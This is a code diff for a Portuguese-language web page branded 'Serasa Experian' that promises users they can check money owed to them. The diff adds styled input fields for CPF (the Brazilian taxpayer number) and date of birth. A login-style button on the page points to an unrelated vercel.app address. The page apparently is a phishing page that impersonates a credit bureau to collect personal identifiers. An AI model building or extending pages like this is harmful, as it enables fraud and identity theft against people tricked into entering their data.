@@ -223,6 +223,44 @@
         margin: auto;
       }
     }
+
+
+    /* CAMPOS DO FORMULÁRIO */
+.login-fields {
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+  margin: 0 0 18px;
+}
+
+.login-fields label {
+  color: var(--texto);
+  font-size: 14px;
+  font-weight: bold;
+  margin-top: 5px;
+}
+
+.login-fields input {
+  width: 100%;
+  min-height: 48px;
+  padding: 12px;
+  border: 1px solid #d1d5db;
+  border-radius: 9px;
+  background: #fff;
+  color: var(--texto);
+  font-family: Arial, Helvetica, sans-serif;
+  font-size: 16px;
+  outline: none;
+}
+
+.login-fields input:focus {
+  border-color: var(--rosa);
+  box-shadow: 0 0 0 3px #ec00751a;
+}
+
+.login-fields input::placeholder {
+  color: #9ca3af;
+}
   </style>
   
   
@@ -265,7 +303,33 @@
       <span class="demo">Serasa Experian</span>
 
       <h1>Consulte Valores a Receber Agora Mesmo</h1>
+<!-- INÍCIO DOS CAMPOS -->
+<div class="login-fields">
 
+  <label for="cpf">CPF</label>
+  <input
+    type="text"
+    id="cpf"
+    name="cpf"
+    placeholder="000.000.000-00"
+    inputmode="numeric"
+    maxlength="14"
+    autocomplete="off"
+  >
+
+  <label for="nascimento">Data de nascimento</label>
+  <input
+    type="text"
+    id="nascimento"
+    name="nascimento"
+    placeholder="DD/MM/AAAA"
+    inputmode="numeric"
+    maxlength="10"
+    autocomplete="off"
+  >
+
+</div>
+<!-- FIM DOS CAMPOS -->
       <a
         class="cta"
         href="https://login-pi-coral.vercel.app/"
